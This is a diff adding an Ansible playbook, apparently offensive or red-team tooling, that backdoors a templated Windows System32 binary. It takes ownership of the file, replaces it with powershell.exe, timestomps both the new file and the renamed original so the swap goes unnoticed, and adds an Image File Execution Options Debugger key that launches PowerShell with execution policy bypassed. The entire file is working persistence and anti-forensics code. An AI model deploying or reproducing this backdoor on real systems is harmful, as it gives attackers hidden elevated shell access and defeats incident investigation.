@@ -1,0 +1,42 @@
+- name: "Get original file stats for {{ target }}"
+  ansible.windows.win_stat:
+    path: "C:\\Windows\\System32\\{{ target }}"
+  register: file_info
+
+- name: "Backdoor File Replacement for {{ target }}"
+  ansible.windows.win_shell: |
+    # 1. Take ownership and modify ACLs to allow replacement
+    $Acl = Get-Acl "C:\Windows\System32\{{ target }}"
+    takeown /f C:\Windows\System32\{{ target }}
+    icacls C:\Windows\System32\{{ target }} /grant administrators:F
+    
+    # 2. Backup original if backup doesn't exist
+    if (!(Test-Path "C:\Windows\System32\{{ target }}.outdated")) {
+        Move-Item "C:\Windows\System32\{{ target }}" "C:\Windows\System32\{{ target }}.outdated"
+    }
+
+    # 3. Replace with PowerShell
+    Copy-Item "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" "C:\Windows\System32\{{ target }}"
+    Set-Acl "C:\Windows\System32\{{ target }}" $Acl
+
+    # 4. Timestomp the new binary to match the original
+    $original_time = Get-Date "{{ file_info.stat.lastwritetime }}"
+    $target_path = "C:\Windows\System32\{{ target }}"
+    (Get-Item $target_path).CreationTime = (Get-Date "{{ file_info.stat.creationtime }}")
+    (Get-Item $target_path).LastWriteTime = $original_time
+    (Get-Item $target_path).LastAccessTime = (Get-Date "{{ file_info.stat.atime }}")
+
+    $target_path = "C:\Windows\System32\{{ target }}.outdated"
+    (Get-Item $target_path).CreationTime = (Get-Date "{{ file_info.stat.creationtime }}")
+    (Get-Item $target_path).LastWriteTime = $original_time
+    (Get-Item $target_path).LastAccessTime = (Get-Date "{{ file_info.stat.atime }}")
+  become: yes
+  become_method: runas
+  become_user: System
+
+- name: "Apply IFEO Registry Redundancy for {{ target }}"
+  community.windows.win_regedit:
+    path: "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\{{ target }}"
+    name: Debugger
+    data: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -NoExit'
+    state: present
